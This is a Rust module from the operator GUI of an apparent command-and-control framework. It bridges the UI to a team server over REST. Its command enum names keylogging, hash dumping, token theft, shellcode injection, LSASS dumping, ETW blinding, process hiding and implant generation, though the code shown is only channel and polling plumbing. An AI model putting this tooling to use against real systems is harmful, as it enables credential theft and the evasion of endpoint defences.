//! Data bridge: the ONLY place that touches the network or blocks.
//!
//! Architecture (validated against Makepad 2.0's `automate` example):
//!
//! ```text
//!   UI thread (Makepad main)            IO worker (std::thread + tokio)
//!   ┌──────────────────────┐            ┌───────────────────────────┐
//!   │ App                  │            │ reqwest async client      │
//!   │  state_updates:      │  Snapshot  │  - GET /api/sessions 2s  │
//!   │    ToUIReceiver <────├────────────┤  - per-session drain      │
//!   │  ui_controls:        │  Cmd       │    (per-task backoff)     │
//!   │    FromUISender ────>├────────────>│ send() = set_ui_signal() │
//!   └──────────────────────┘            └───────────────────────────┘
//! ```
//!
//! `ToUISender::send()` calls `SignalToUI::set_ui_signal()`, which wakes the
//! Makepad event loop; `App::handle_signal` (via `MatchEvent`) drains the
//! channel and refreshes. The UI thread NEVER blocks on IO — it only ever
//! copies cheap `Vec`s out of the channel. This is what makes the client
//! "fast + low-resource": the GPU renders at the monitor's native rate, IO is
//! off-thread, and the UI redraws only when a snapshot changes.
//!
//! Module map (split from the old 2.5k-line `bridge.rs`, 2026-07-17):
//! * [`mod@self`] — wire types, [`Cmd`], [`Bridge`]/[`spawn`], the worker-loop
//!   skeleton, and the shared [`WorkerState`].
//! * [`connect`] — connect-attempt lifecycle (stages, timeout guard).
//! * [`poll`] — session polling, result draining, keylog-stream upkeep, and
//!   result routing to the UI globals.
//! * [`dispatch`] — the `Cmd` → REST/task-queue dispatch (console commands),
//!   with [`files`] and [`creds`] split out per domain.
//! * [`rest`] — the async REST helpers every module builds on.

use std::time::Duration;

use makepad_widgets::log;
// `ToUIReceiver`/`FromUISender` come from makepad-network, which platform
// re-exports as `makepad_platform::makepad_network` (platform/src/lib.rs:90).
// widgets → draw → platform, so we reach it via makepad_widgets.
use makepad_widgets::makepad_platform::makepad_network::ui_signal::{
    FromUIReceiver, FromUISender, ToUIReceiver, ToUISender,
};

mod connect;
mod creds;
mod dispatch;
mod files;
mod poll;
mod rest;

// ---- wire types (mirror the REST API; same shapes as the egui client) ----

// SessionView + the authed/session_signature helpers are shared (see
// crates/rest) so client-ui can't drift from the server's real output — the
// prior local copy silently dropped age_secs/ja3/ja4. SessionView is re-exported
// (pub) so `crate::bridge::SessionView` still resolves for Snapshot/main.rs.
pub use nyx_rest::SessionView;
pub(crate) use nyx_rest::{authed, session_signature};

/// A full UI snapshot pushed worker→UI. Coarse-grained on purpose: the worker
/// owns the polling cadence and only sends when something changed, so the UI
/// redraws at most once per poll interval (default 2s), not per byte of shell
/// output.
#[derive(Debug, Clone, Default)]
pub struct Snapshot {
    /// Most recent session list (empty until the first successful fetch).
    pub sessions: Vec<SessionView>,
    /// Log lines accumulated since the last snapshot. The UI appends these to
    /// its event log; the worker trims its own buffer so this channel can't
    /// grow unbounded (H2-style memory-DoS guard).
    pub log_lines: Vec<String>,
    /// Connection state — drives the top status bar.
    pub connected: bool,
    /// True while a `Cmd::Connect` attempt is in flight (between the Connect
    /// command and the first `fetch_sessions` resolution). Drives the connect
    /// overlay: shown while true, fades out when it flips false.
    pub connecting: bool,
    /// The real connection stage currently in flight (or the last one reached).
    /// Drives the step-tip line under the progress bar.
    pub connect_stage: ConnectStage,
    /// BOF execution updates since the last snapshot. Each entry is appended to
    /// the BOF history UI global by the App. Empty unless a BOF task changed
    /// state (enqueued / completed / errored).
    pub bof_updates: Vec<BofUpdate>,
    /// Per-session shell output lines: (session_id, line). Drained into
    /// `CONSOLE` in `apply_snapshot` so the per-session console widget can
    /// render them without touching the global event log.
    pub console_lines: Vec<(String, String)>,
}

/// One BOF lifecycle event, pushed worker→UI and routed into the BOFS global.
#[derive(Debug, Clone)]
pub struct BofUpdate {
    pub name: String,
    pub args: String,
    pub status: BofState,
}

/// Lifecycle of a BOF task. Mirrors the widget's display status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum BofState {
    Pending,
    Done,
    Error,
}

/// A real, observable stage of an in-flight connect attempt. Drives the
/// step-tip line under the connect overlay (see the overlay design spec).
/// `Resolving` is set when `Cmd::Connect` arrives; `Connecting` while the
/// request round-trip is in flight; `Done`/`Failed` from the fetch_sessions
/// Ok/Err branches. (`Authenticating` is reserved for a future fetch_sessions
/// split per spec §4.5 — reqwest bundles send+decode into one future.) reqwest's
/// `GaiResolver` isn't publicly constructable, so DNS/TCP aren't isolated as
/// separate stages without a resolver hook — they surface together as
/// `Connecting`, which is the honest description.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum ConnectStage {
    #[default]
    Idle,
    Resolving,
    Connecting,
    Authenticating,
    Done,
    Failed,
}

/// UI→worker command. Enum keeps the channel message type closed and explicit.
#[derive(Debug, Clone)]
pub enum Cmd {
    /// Target team server base URL + optional API bearer token.
    /// `password` is the operator-typed token sent as `Authorization: Bearer`.
    /// `None` when the server has no `NYX_TOKEN` configured (local dev).
    Connect {
        server: String,
        password: Option<String>,
    },
    /// Enqueue a shell task on the given session.
    Shell {
        session: String,
        args: String,
    },
    /// Enqueue a shell task but parse the result for FileTree.
    Ls {
        session: String,
        args: String,
    },
    /// Enqueue a shell task but parse the result for ProcTable.
    Ps {
        session: String,
        args: String,
    },
    /// Basic tasks
    Ping {
        session: String,
    },
    Sleep {
        session: String,
        seconds: u32,
        jitter_pct: u8,
    },
    Exit {
        session: String,
    },
    /// File operations
    Upload {
        session: String,
        name: String,
        data_hex: String,
    },
    Download {
        session: String,
        path: String,
    },
    FileOp {
        session: String,
        op: String,
        path: String,
        dest: Option<String>,
    },
    Driveinfo {
        session: String,
    },
    /// Network & Pivoting
    ConnectChan {
        session: String,
        host: String,
        port: u16,
    },
    Socks {
        session: String,
        chan: u32,
        op: u8,
        addr: String,
        port: u16,
    },
    Portscan {
        session: String,
        host: String,
        ports: String,
    },
    Net {
        session: String,
        query: String,
    },
    /// Information & Media
    Screenshot {
        session: String,
        monitor: u8,
    },
    Screenwatch {
        session: String,
        interval_secs: u32,
    },
    Clipboard {
        session: String,
    },
    Env {
        session: String,
        name: String,
    },
    Keylog {
        session: String,
        action: u8,
    },
    Hashdump {
        session: String,
        method: u8,
    },
    /// Token operations (lateral movement). steal/make a token, revert
    /// impersonation, query the current thread identity.
    StealToken {
        session: String,
        pid: u32,
    },
    MakeToken {
        session: String,
        domain: String,
        user: String,
        password: String,
        logon_type: u8,
    },
    Rev2Self {
        session: String,
    },
    GetUid {
        session: String,
    },
    /// Pull server-side creds (`GET /api/creds`) and print them to the log.
    FetchCreds {
        reveal: bool,
    },
    /// Query the server audit log (`GET /api/audit`) and print to the log.
    FetchAudit {
        operator: Option<String>,
        action: Option<String>,
        limit: Option<u32>,
    },
    /// Enqueue a BOF (Beacon Object File) task on the given session. `name` is
    /// the COFF entry label shown in the BOF history; `args` the space-separated
    /// arg string (split here to match the server's `Vec<String>`); `data_hex`
    /// the hex-encoded COFF bytes. The result (`kind == "bof"`) is routed into
    /// the BOFS UI global.
    Bof {
        session: String,
        name: String,
        args: String,
        data_hex: String,
    },
    /// Inject shellcode into a target process. `method` selects the technique
    /// (1 = local, 2 = remote, etc.; see `Command::Inject` in `protocol::msg`),
    /// `pid` the target, `spawn_to` optional fork target, `sc_hex` the hex-encoded
    /// payload. The JSON shape mirrors TUI's `/inject`.
    Inject {
        session: String,
        method: u8,
        pid: u32,
        spawn_to: String,
        sc_hex: String,
    },
    /// Close an open P2P/SOCKS channel on a session. ChannelClose is the
    /// counterpart to ConnectChan; without it pivots have no teardown.
    ChannelClose {
        session: String,
        chan: u32,
    },
    /// `GET /api/tasks?session=<hex>` — list the queued tasks for a session.
    /// Output is rendered into the event log; mirrors TUI's `/tasks`.
    FetchTasks {
        session: String,
    },
    /// `GET /api/profile` — fetch the active Malleable C2 profile metadata.
    /// Mirrors TUI's `/profile` overlay.
    FetchProfile,
    /// `GET /api/audit/verify` — verify the hash chain of the audit log.
    /// Mirrors TUI's `/audit verify`.
    FetchAuditVerify,
    /// `POST /api/creds` — add a harvested credential to the server-side vault.
    /// Mirrors TUI's `/creds add`.
    CredAdd {
        realm: String,
        user: String,
        kind: String,
        secret: String,
    },
    /// `POST /api/creds/delete` — remove a credential by composite key.
    /// Mirrors TUI's `/creds del`.
    CredDelete {
        realm: String,
        user: String,
        kind: String,
    },
    /// Force an out-of-band session-list refresh (reset the signature so the
    /// next worker cycle unconditionally re-fetches). Mirrors TUI's `/sessions
    /// refresh`.
    RefreshSessions,
    // ---- Kernel daemon ops (P6) — mirror the TUI's `/driver-status`,
    // `/blind-etw`, `/hide <pid>`, `/dump-lsass <pid>`, `/neutralize <pid>`,
    // `/detach-mf`. These hit the server-control API (`/api/kernel/*`),
    // not the per-session task queue.
    KernelStatus,
    KernelBlindEtw,
    KernelHide { pid: u32 },
    KernelDumpLsass { pid: u32 },
    KernelNeutralize { pid: u32 },
    KernelDetachMinifilter,
    /// T-REX target reconnaissance — enqueued on the session task queue as
    /// `{"type":"trex"}` (same as the TUI).
    Trex { session: String },
    /// Set the session's C2 transport channel (numeric id 0-8). Mirrors TUI's
    /// `/channel <id>`.
    SetChannel { session: String, channel: u8 },
    /// `POST /api/generate-implant` — build a per-implant binary. Mirrors TUI's
    /// `/generate`.
    GenerateImplant {
        callback: String,
        port: u16,
        format: String,
        uri: String,
        sleep: u32,
        jitter: u8,
        tls: bool,
        features: u32,
    },
    /// `GET /api/implants` — list all generated implants. Mirrors TUI's
    /// `/implants`.
    FetchImplants,
    /// `POST /api/implant/revoke` — revoke an implant by pubkey. Mirrors TUI's
    /// `/revoke <pub>`.
    RevokeImplant { implant_pub: String },
    /// Start continuous keylog streaming: the worker re-enqueues a
    /// `keylog action=2` dump task every `interval_secs` until
    /// `KeylogStreamStop` clears the stream. Mirrors TUI's
    /// `/keylog stream [secs]`.
    KeylogStreamStart { session: String, interval_secs: u32 },
    /// Stop continuous keylog streaming for the given session. Mirrors TUI's
    /// `/keylog unstream`.
    KeylogStreamStop { session: String },
    /// Stop the worker loop (app shutdown).
    Shutdown,
}

/// Default poll interval for the session list. Short enough to feel live,
/// long enough to not hammer the team server. Tunable later via profile.
const SESSION_POLL: Duration = Duration::from_secs(2);

/// Bound on the worker's pending log buffer — if the UI hasn't drained this
/// many lines we drop oldest. Prevents a slow UI from OOMing the worker if
/// the server floods events (mirrors the server's own H2 memory-DoS bound).
const LOG_BUFFER_CAP: usize = 1024;

/// Channels the `App` holds. Returned by [`spawn`].
pub struct Bridge {
    /// Worker→UI snapshots. Drain in `handle_signal`.
    pub to_ui: ToUIReceiver<Snapshot>,
    /// UI→worker commands. Send on button clicks.
    pub from_ui: FromUISender<Cmd>,
}

/// Spin up the IO worker and return the channel ends the App holds.
///
/// The worker owns its own tokio runtime so the rest of the crate stays
/// sync-friendly (Makepad's event loop is sync). One thread, one runtime —
/// `current_thread` keeps it to a single OS thread: minimal footprint, fits
/// "low-resource". No thread-pool proliferation.
pub fn spawn() -> Bridge {
    let to_ui: ToUIReceiver<Snapshot> = ToUIReceiver::default();
    let sender = to_ui.sender();
    let mut from_ui: FromUISender<Cmd> = FromUISender::default();
    // receiver() consumes &mut self and can only be called once — do it here,
    // before handing the sender end to the App.
    let cmd_rx = from_ui.receiver();

    std::thread::spawn(move || {
        let rt = match tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
        {
            Ok(rt) => rt,
            Err(e) => {
                log!("nyx bridge: tokio runtime build failed: {e}");
                return;
            }
        };
        rt.block_on(worker_loop(cmd_rx, sender));
    });

    Bridge { to_ui, from_ui }
}

/// All mutable state the worker loop carries between ticks. Grouped so the
/// per-domain modules ([`connect`], [`poll`], [`dispatch`]) can take `&mut
/// WorkerState` instead of a dozen loose parameters.
#[derive(Default)]
pub(crate) struct WorkerState {
    /// (server_url, optional bearer token). None until first Connect.
    pub server: Option<(String, Option<String>)>,
    /// Pending tasks whose results we're still awaiting.
    pub pending: Vec<poll::PendingTask>,
    /// Log lines not yet flushed to the UI.
    pub log_buf: Vec<String>,
    /// BOF lifecycle updates not yet flushed.
    pub bof_updates: Vec<BofUpdate>,
    /// Per-session console lines not yet flushed.
    pub console_lines: Vec<(String, String)>,
    /// Change-detection signature of the last reported session list.
    pub last_session_sig: String,
    /// Tracks the connection state last REPORTED to the UI. A connect→disconnect
    /// (or vice-versa) transition must always push a snapshot even if nothing
    /// else changed — otherwise the UI never learns it connected (e.g. fetching
    /// an empty session list on first connect yields no signature change, so the
    /// old `changed || log_buf || bof` guard silently swallowed the only
    /// `connected=true` the UI ever needed).
    pub was_connected: bool,
    /// Connect-attempt lifecycle (see [`connect`]).
    pub connect: connect::ConnectState,
    /// Active continuous keylog stream, if any: `(session, interval_secs)`.
    /// Set by `Cmd::KeylogStreamStart`, cleared by `Cmd::KeylogStreamStop`.
    /// While set, the poll loop ensures a `KeylogStream` dump task is always
    /// pending for that session (re-enqueuing one whenever none remains after
    /// the prior dump finishes). Mirrors the TUI's `keylog_streaming` state.
    pub keylog_streaming: Option<(String, u32)>,
}

impl WorkerState {
    /// Flush any accumulated log lines / BOF updates / console lines to the UI.
    fn flush(&mut self, to_ui: &ToUISender<Snapshot>) {
        if !self.log_buf.is_empty() || !self.bof_updates.is_empty() || !self.console_lines.is_empty()
        {
            let _ = to_ui.send(Snapshot {
                log_lines: std::mem::take(&mut self.log_buf),
                connected: true,
                sessions: Vec::new(),
                bof_updates: std::mem::take(&mut self.bof_updates),
                console_lines: std::mem::take(&mut self.console_lines),
                connecting: self.connect.connecting,
                connect_stage: self.connect.stage,
            });
        }
    }
}

// ---- worker loop -----------------------------------------------------------

async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
    let mut st = WorkerState::default();
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .build()
        .expect("reqwest client build");

    loop {
        // 0. 20s timeout: if a connect attempt never resolves (dropped
        // packets, no RST), give up so the overlay can't get stuck open.
        st.check_connect_timeout(&to_ui);

        // 1. Drain any UI→worker commands (non-blocking).
        while let Ok(cmd) = cmd_rx.try_recv() {
            match cmd {
                Cmd::Shutdown => return,
                Cmd::Connect { server, password } => {
                    st.begin_connect(server, password, &to_ui);
                }
                other => st.dispatch(&client, other).await,
            }
        }

        if st.server.is_none() {
            tokio::time::sleep(Duration::from_millis(200)).await;
            continue;
        }

        // 2. Refresh session list (throttled to SESSION_POLL).
        st.poll_sessions(&client, &to_ui).await;

        // 3. Drain task results — ONE request per session per tick (see
        // poll::drain_due_results for why per-task polling lost results).
        st.drain_due_results(&client).await;

        // 4. Keep the continuous keylog stream alive, if one is active.
        st.keylog_stream_upkeep(&client).await;

        // 5. Flush whatever this cycle accumulated.
        st.flush(&to_ui);

        tokio::time::sleep(SESSION_POLL).await;
    }
}

/// Truncate a session id to 8 chars for log lines (matches the UI's `{:.8}`).
pub(crate) fn short(s: &str) -> &str {
    &s[..s.len().min(8)]
}

pub(crate) fn take_snapshot(
    log_buf: &mut Vec<String>,
    connected: bool,
    sessions: &[SessionView],
    bof_updates: &mut Vec<BofUpdate>,
    console_lines: &mut Vec<(String, String)>,
    connecting: bool,
    connect_stage: ConnectStage,
) -> Snapshot {
    Snapshot {
        sessions: sessions.to_vec(),
        log_lines: std::mem::take(log_buf),
        connected,
        connecting,
        connect_stage,
        bof_updates: std::mem::take(bof_updates),
        console_lines: std::mem::take(console_lines),
    }
}

/// `pub(crate)` so the unit test in `#[cfg(test)] mod tests` (and any future
/// integration test) can exercise the cap behaviour directly.
pub(crate) fn log_push(buf: &mut Vec<String>, line: impl Into<String>) {
    buf.push(line.into());
    if buf.len() > LOG_BUFFER_CAP {
        let drop = buf.len() - LOG_BUFFER_CAP;
        buf.drain(..drop);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sv(id: &str, host: &str, user: &str, admin: u8, pend: usize) -> SessionView {
        SessionView {
            id: id.into(),
            hostname: host.into(),
            username: user.into(),
            os: String::new(),
            is_admin: admin,
            pending: pend,
            beacon_id: 0,
            arch: 0,
            pid: 0,
            ..Default::default()
        }
    }

    #[test]
    fn connect_cmd_carries_password() {
        // Cmd::Connect now carries an optional bearer token. This pins the
        // signature so a future refactor can't silently drop it (the original
        // auth-header bug was exactly this: the field didn't exist).
        let c = Cmd::Connect {
            server: "http://x".into(),
            password: Some("sekret".into()),
        };
        match c {
            Cmd::Connect {
                password: Some(p), ..
            } => assert_eq!(p, "sekret"),
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn connect_cmd_allows_no_token() {
        // Local dev server (no NYX_TOKEN) → password is None; must not error.
        let c = Cmd::Connect {
            server: "http://x".into(),
            password: None,
        };
        match c {
            Cmd::Connect { password: None, .. } => {}
            _ => panic!("wrong variant"),
        }
    }

    #[test]
    fn signature_stable_order() {
        // Same list → same signature (so the worker doesn't spam snapshots).
        let a = vec![sv("s1", "h", "u", 0, 1), sv("s2", "h2", "u2", 1, 0)];
        let b = a.clone();
        assert_eq!(session_signature(&a), session_signature(&b));
    }

    #[test]
    fn signature_detects_change() {
        // A changed field (pending count, admin flag, user, host, id) must
        // change the signature — otherwise stale UI.
        let base = vec![sv("s1", "h", "u", 0, 1)];
        let sig0 = session_signature(&base);
        assert_ne!(
            sig0,
            session_signature(&vec![sv("s1", "h", "u", 0, 2)]),
            "pending change"
        );
        assert_ne!(
            sig0,
            session_signature(&vec![sv("s1", "h", "u", 1, 1)]),
            "admin change"
        );
        assert_ne!(
            sig0,
            session_signature(&vec![sv("s1", "h2", "u", 0, 1)]),
            "host change"
        );
        assert_ne!(
            sig0,
            session_signature(&vec![sv("s2", "h", "u", 0, 1)]),
            "id change"
        );
    }

    #[test]
    fn signature_empty_is_empty_string() {
        assert_eq!(session_signature(&[]), "");
    }

    #[test]
    fn log_push_appends() {
        let mut buf = Vec::new();
        log_push(&mut buf, "a");
        log_push(&mut buf, "b");
        assert_eq!(buf, vec!["a".to_string(), "b".to_string()]);
    }

    #[test]
    fn log_push_caps_and_drops_oldest() {
        // Fill past the cap; oldest entries are dropped, newest kept.
        let mut buf = Vec::new();
        for i in 0..(LOG_BUFFER_CAP + 50) {
            log_push(&mut buf, i.to_string());
        }
        assert_eq!(buf.len(), LOG_BUFFER_CAP, "buffer must be capped exactly");
        // The first surviving entry should be the one at offset 50 (we dropped 50).
        assert_eq!(buf[0], "50", "oldest surviving line must be index 50");
        assert_eq!(buf.last().unwrap(), &(LOG_BUFFER_CAP + 50 - 1).to_string());
    }

    #[test]
    fn connect_stage_default_is_idle() {
        // The overlay must start hidden → stage Idle. Pins the Default derive.
        assert_eq!(ConnectStage::default(), ConnectStage::Idle);
    }

    #[test]
    fn connect_stage_progression_resolving_to_done() {
        // Pins the connect-overlay stage model: a successful attempt walks
        // Idle → Resolving → Connecting → Done. These are the values the worker
        // assigns and the UI's step-tip reads (see the overlay design spec).
        let s0 = ConnectStage::Idle;
        let s1 = ConnectStage::Resolving;
        let s2 = ConnectStage::Connecting;
        let s3 = ConnectStage::Done;
        assert_ne!(s0, s1);
        assert_ne!(s1, s2);
        assert_ne!(s2, s3);
    }
}
